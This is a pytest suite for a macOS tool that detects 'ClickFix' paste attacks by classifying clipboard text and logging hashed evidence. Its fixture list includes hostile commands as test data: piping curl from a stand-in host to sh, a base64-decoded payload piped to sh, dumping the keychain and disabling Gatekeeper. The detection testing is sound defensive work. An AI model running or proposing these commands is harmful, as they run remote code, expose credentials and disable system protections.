from __future__ import annotations

import base64
import hashlib
import importlib.util
import json
import sqlite3
import subprocess
import sys
from datetime import datetime, timezone
from pathlib import Path

import pytest

from mac_audit_agent.clickfix.classifier import classify_text, evidence_hash
from mac_audit_agent.clickfix.evidence import ClickFixEvidenceStore
from mac_audit_agent.clickfix.models import GuardProfile
from mac_audit_agent.clickfix.policy import ClickFixPolicy
from mac_audit_agent.clickfix.service import ClickFixService
from mac_audit_agent.clickfix.health import doctor
from mac_audit_agent.clickfix.native_journal import NativeJournalConsumer


def test_development_installer_treats_codesign_not_set_as_no_team(monkeypatch) -> None:
    path = Path(__file__).parents[1] / "scripts/install_clickfix_guard.py"
    spec = importlib.util.spec_from_file_location("install_clickfix_guard_test", path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec); spec.loader.exec_module(module)
    result = type("Result", (), {"stdout": "", "stderr": "TeamIdentifier=not set\n"})()
    monkeypatch.setattr(module.subprocess, "run", lambda *args, **kwargs: result)
    assert module._signing_team(Path("demo.app")) == ""


def test_native_agent_retries_event_tap_after_input_monitoring_is_granted() -> None:
    source = (Path(__file__).parents[1] / "native/ClickFixGuard/Sources/ClickFixGuardAgent/main.swift").read_text()
    assert 'inputMonitoring == "INPUT_MONITORING_GRANTED"' in source
    assert "eventTapActive = tap.start()" in source


def envelope(text: str = "ordinary prose", *, access: str = "CLIPBOARD_ACCESS_GRANTED", replay: bool = False) -> dict:
    result = classify_text(text)
    return {
        "schema_version": 1, "event_id": "cfx-event-test-" + evidence_hash(text + str(replay))[:16],
        "detected_at_utc": datetime.now(timezone.utc).isoformat(), "monotonic_timestamp_ns": 123,
        "key_code": 49, "modifier_flags": 0x100000, "physical_event": True, "replay_event": replay,
        "foreground_pid": 123, "foreground_bundle_id": "com.example.browser",
        "clipboard_access_state": access, "clipboard_classification": result.classification,
        "clipboard_sha256": evidence_hash(text), "clipboard_byte_length": len(text.encode()),
        "classifier_version": result.classifier_version, "confidence": result.confidence,
        "matched_categories": result.matched_categories, "redacted_preview": result.redacted_preview,
        "sensor_mode": "OBSERVE", "input_monitoring_state": "INPUT_MONITORING_GRANTED",
        "accessibility_state": "ACCESSIBILITY_UNKNOWN", "spotlight_suppressed": False,
    }


@pytest.fixture
def store(tmp_path: Path):
    with ClickFixEvidenceStore(tmp_path / "clickfix.sqlite3") as value: yield value


@pytest.mark.parametrize("fixture", ["ls", "whoami", "#!/bin/zsh\necho inert", "curl https://invalid.example/a | sh", "osascript -e 'return 1'", "/bin/zsh -c 'id'", "python3 -c 'print(1)'", "pwsh -Command 'Write-Output inert'", "launchctl load inert.plist", "sudo installer -pkg payload.pkg -target /", "rm -rf /tmp/example", "defaults write com.example setting true", "security dump-keychain", "spctl --master-disable", "echo ZWNobyBpbmVydA== | base64 -D | sh"])
def test_command_fixtures_are_risky_without_execution(fixture: str) -> None:
    result = classify_text(fixture)
    assert result.command_like or result.script_like
    assert result.classification not in {"PLAIN_TEXT", "CLASSIFICATION_FAILED"}


@pytest.mark.parametrize("fixture", ["", "ordinary meeting notes", "https://example.invalid/article", "A short paragraph about shellfish."])
def test_safe_text_does_not_become_command(fixture: str) -> None:
    result = classify_text(fixture)
    assert not result.command_like


def test_clean_shortcut_is_audited_without_visible_alert(store: ClickFixEvidenceStore) -> None:
    result = ClickFixService(store, ClickFixPolicy.for_profile(GuardProfile.WARN)).ingest_shortcut(envelope())
    assert result["persisted"] and result["incident_id"] is None
    alerts = store.pending_alerts()
    assert alerts == []
    assert store.verify()["valid"]


def test_risky_shortcut_persists_only_linked_critical_alert(store: ClickFixEvidenceStore) -> None:
    result = ClickFixService(store, ClickFixPolicy.for_profile(GuardProfile.PROTECT)).ingest_shortcut(envelope("curl https://invalid.example/a | sh"))
    assert result["incident_id"] and result["suppress_shortcut"] and not result["replay_shortcut"]
    alerts = store.pending_alerts()
    assert [item["severity"] for item in alerts] == ["critical"]
    assert alerts[0]["disposition"] == "POTENTIAL_CLICKFIX"
    row = store.connection.execute("SELECT shortcut_event_id FROM clickfix_links WHERE incident_id=?", (result["incident_id"],)).fetchone()
    assert row and row[0] == result["event_id"]


def test_permission_denial_is_high_unknown_not_clean(store: ClickFixEvidenceStore) -> None:
    item = envelope(); item.update(clipboard_access_state="CLIPBOARD_ACCESS_DENIED", clipboard_classification="CLASSIFICATION_FAILED")
    result = ClickFixService(store, ClickFixPolicy.for_profile(GuardProfile.HIGH_ASSURANCE)).ingest_shortcut(item)
    assert result["suppress_shortcut"] and not result["replay_shortcut"]
    assert result["disposition"] == "INSPECTION_UNAVAILABLE"
    assert store.pending_alerts() == []


def test_source_code_fragment_alone_does_not_create_clickfix_incident(store: ClickFixEvidenceStore) -> None:
    result = ClickFixService(store, ClickFixPolicy.for_profile(GuardProfile.WARN)).ingest_shortcut(envelope("function example(value) { return value + 1 }"))
    assert result["incident_id"] is None
    assert store.pending_alerts() == []


def test_replay_marker_envelope_is_never_persisted(store: ClickFixEvidenceStore) -> None:
    result = ClickFixService(store, ClickFixPolicy.for_profile(GuardProfile.PROTECT)).ingest_shortcut(envelope(replay=True))
    assert result == {"accepted": False, "reason": "synthetic replay ignored", "replay_shortcut": False}
    assert store.verify()["records_verified"] == 0


def test_event_records_are_immutable_and_tamper_detected(store: ClickFixEvidenceStore) -> None:
    ClickFixService(store, ClickFixPolicy.for_profile(GuardProfile.WARN)).ingest_shortcut(envelope())
    with pytest.raises(sqlite3.DatabaseError): store.connection.execute("UPDATE clickfix_records SET payload_json='{}'")
    store.connection.execute("DROP TRIGGER clickfix_records_no_update")
    store.connection.execute("UPDATE clickfix_records SET payload_json='{}' WHERE sequence=1")
    assert not store.verify()["valid"]


def test_raw_clipboard_is_absent_from_persistence(store: ClickFixEvidenceStore) -> None:
    secret = "curl https://invalid.example/very-secret-token | sh"
    ClickFixService(store, ClickFixPolicy.for_profile(GuardProfile.WARN)).ingest_shortcut(envelope(secret))
    database_text = "\n".join(str(value) for row in store.connection.execute("SELECT payload_json FROM clickfix_records") for value in row)
    assert secret not in database_text
    assert evidence_hash(secret) in database_text


def test_cli_is_headless_and_emits_json(tmp_path: Path) -> None:
    command = [sys.executable, "-m", "mac_audit_agent.clickfix", "test-classifier", "--fixture", "clickfix", "--db", str(tmp_path / "cli.sqlite3")]
    result = subprocess.run(command, capture_output=True, text=True, check=False)
    assert result.returncode == 0, result.stderr
    payload = json.loads(result.stdout); assert payload["executed"] is False
    probe = subprocess.run([sys.executable, "-c", "import sys; import mac_audit_agent.clickfix.cli; print(any(name.startswith('PySide6') for name in sys.modules))"], capture_output=True, text=True, check=False)
    assert probe.stdout.strip() == "False"


def test_native_callback_has_no_clipboard_disk_network_python_or_ui_calls() -> None:
    source = (Path(__file__).parents[1] / "native/ClickFixGuard/Sources/ClickFixGuardAgent/ClickFixEventTap.swift").read_text()
    callback = source[source.index("private func handle"):source.index("private static let callback")]
    for forbidden in ("NSPasteboard", "FileHandle", "URLSession", "Python", "UserNotifications", "AppKit"):
        assert forbidden not in callback


def test_doctor_distinguishes_active_monitoring_from_disconnected_xpc(tmp_path: Path, monkeypatch) -> None:
    agent = tmp_path / "MSAAClickFixGuardAgent.app"
    agent.mkdir()
    monkeypatch.setenv("MSAA_CLICKFIX_AGENT", str(agent))
    monkeypatch.setattr("mac_audit_agent.clickfix.health.subprocess.run", lambda *args, **kwargs: type("Result", (), {"returncode": 0})())
    status = doctor({
        "last_heartbeat_utc": datetime.now(timezone.utc).isoformat(),
        "event_tap_active": True,
        "input_monitoring_granted": True,
        "classifier_signature_valid": True,
        "xpc_listener_ready": True,
        "xpc_authenticated": False,
    })
    assert status["monitoring_active"] is True
    assert status["integration_active"] is False
    assert status["fully_active"] is False
    assert status["error_codes"] == ["CFX012_XPC_CLIENT_NOT_CONNECTED"]


def test_development_demo_uses_verified_journal_instead_of_team_xpc(tmp_path: Path, monkeypatch) -> None:
    agent = tmp_path / "MSAAClickFixGuardAgent.app"; agent.mkdir()
    monkeypatch.setenv("MSAA_CLICKFIX_AGENT", str(agent))
    monkeypatch.setattr("mac_audit_agent.clickfix.health.subprocess.run", lambda *args, **kwargs: type("Result", (), {"returncode": 0})())
    status = doctor({
        "last_heartbeat_utc": datetime.now(timezone.utc).isoformat(),
        "event_tap_active": True, "input_monitoring_granted": True,
        "classifier_signature_valid": True, "xpc_listener_ready": True,
        "xpc_authenticated": False, "development_demo": True,
        "native_journal_integrity_valid": True,
    })
    assert status["integration_active"] is True
    assert status["integration_mode"] == "verified_native_journal"
    assert status["fully_active"] is True
    assert "CFX012_XPC_CLIENT_NOT_CONNECTED" not in status["error_codes"]


def test_doctor_does_not_report_downstream_listener_errors_before_install(tmp_path: Path, monkeypatch) -> None:
    monkeypatch.setenv("MSAA_CLICKFIX_AGENT", str(tmp_path / "missing.app"))
    status = doctor({})
    assert status["error_codes"] == ["CFX001_SENSOR_NOT_INSTALLED"]
    assert status["blocked_by"] == ["clickfix_guard_not_installed"]
    assert "install" in status["recommended_action"].lower()


def test_native_health_snapshot_reaches_python_doctor(store: ClickFixEvidenceStore, tmp_path: Path) -> None:
    payload = json.dumps({
        "last_heartbeat_utc": datetime.now(timezone.utc).isoformat(),
        "event_tap_active": True,
        "input_monitoring_granted": True,
        "classifier_signature_valid": True,
        "xpc_listener_ready": True,
        "xpc_authenticated": False,
    }, sort_keys=True, separators=(",", ":")).encode()
    previous = "0" * 64
    digest = hashlib.sha256(previous.encode("ascii") + b"health" + payload).hexdigest()
    journal = tmp_path / "events.jsonl"
    journal.write_text(json.dumps({
        "sequence": 1,
        "recordType": "health",
        "recordID": "cfx-health-test",
        "occurredAt": datetime.now(timezone.utc).isoformat(),
        "payload": base64.b64encode(payload).decode("ascii"),
        "previousDigest": previous,
        "digest": digest,
    }) + "\n")

    NativeJournalConsumer(journal, ClickFixService(store, ClickFixPolicy.for_profile(GuardProfile.WARN))).consume()

    health = store.health()
    assert health["event_tap_active"] is True
    assert health["xpc_listener_ready"] is True
    assert health["xpc_authenticated"] is False
    assert health["native_journal_last_sequence"] == 1


def test_health_alerts_are_deduplicated_and_resolved_after_recovery(store: ClickFixEvidenceStore) -> None:
    store.persist_health_alert("health-1", "CFX003_INPUT_MONITORING_DENIED", {"error_code": "CFX003_INPUT_MONITORING_DENIED"})
    store.persist_health_alert("health-2", "CFX003_INPUT_MONITORING_DENIED", {"error_code": "CFX003_INPUT_MONITORING_DENIED"})
    assert len(store.pending_alerts()) == 1
    assert store.reconcile_health_alerts({"CFX003_INPUT_MONITORING_DENIED"}) == 0
    assert store.reconcile_health_alerts(set()) == 1
    assert store.pending_alerts() == []
